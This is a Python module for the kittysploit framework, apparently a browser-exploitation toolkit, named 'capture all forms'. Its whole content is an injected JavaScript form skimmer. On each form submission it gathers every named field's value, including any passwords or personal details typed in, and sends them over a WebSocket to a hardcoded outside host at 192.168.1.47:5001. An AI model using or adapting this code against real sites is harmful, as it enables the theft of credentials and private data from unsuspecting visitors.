from kittysploit import *

class Module(BrowserAuxiliary):

	__info__ = {
		"name": "capture all forms",
		"description": "Capture all forms",
		"target": (
			"all",
		),
	}	
	
	def run(self):
		data = f"""
function collectInputs() {{
    var forms = parent.document.getElementsByTagName("form");
    for (var i = 0;i < forms.length;i++) {{
        forms[i].addEventListener('submit', function() {{
            var data = [],
                subforms = parent.document.getElementsByTagName("form");

            for (x = 0 ; x < subforms.length; x++) {{
                var elements = subforms[x].elements;
                for (e = 0; e < elements.length; e++) {{
                    if (elements[e].name.length) {{
                        data.push(elements[e].name + "=" + elements[e].value);
                    }}
                }}
            }}
            var d = data.join('&');
            ws = new WebSocket("ws://192.168.1.47:5001");
            ws.onopen = function() {{
            ws.send(d);
            }};            
            // attachForm(data.join('&));
        }}, false);
    }}
}}
window.onload = collectInputs();
		"""
		self.send_js(data)
